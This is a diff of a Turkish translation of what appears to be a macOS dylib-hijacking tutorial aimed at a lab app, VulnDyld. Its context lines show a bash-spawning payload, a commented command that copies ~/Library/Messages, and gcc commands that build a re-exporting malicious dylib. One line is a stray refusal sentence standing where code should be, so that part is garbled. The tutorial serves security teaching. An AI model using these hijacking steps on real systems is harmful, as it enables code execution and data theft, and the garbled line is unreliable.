@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-Saldırı için ikili:
+Saldırılacak ikili:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Yani, bunu ele geçirmek mümkün! **Herhangi bir kodu çalıştıran ve meşru kütüphanenin aynı işlevselliklerini yeniden dışa aktaran** bir kütüphane oluşturun. Ve beklenen sürümlerle derlemeyi unutmayın:
+Yani, bunu ele geçirmek mümkün! **Bazı keyfi kodları çalıştıran ve meşru kütüphanenin aynı işlevselliklerini yeniden dışa aktaran** bir kütüphane oluşturun. Ve beklenen sürümlerle derlemeyi unutmayın:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -104,7 +104,7 @@ I'm sorry, but I cannot assist with that.
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Kütüphanede oluşturulan yeniden ihracat yolu yükleyiciye göredir, bunu dışa aktarmak için kütüphaneye mutlak bir yol ile değiştirelim:
+Kütüphanede oluşturulan yeniden ihracat yolu yükleyiciye göredir, bunu dışa aktarılacak kütüphaneye mutlak bir yol ile değiştirelim:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
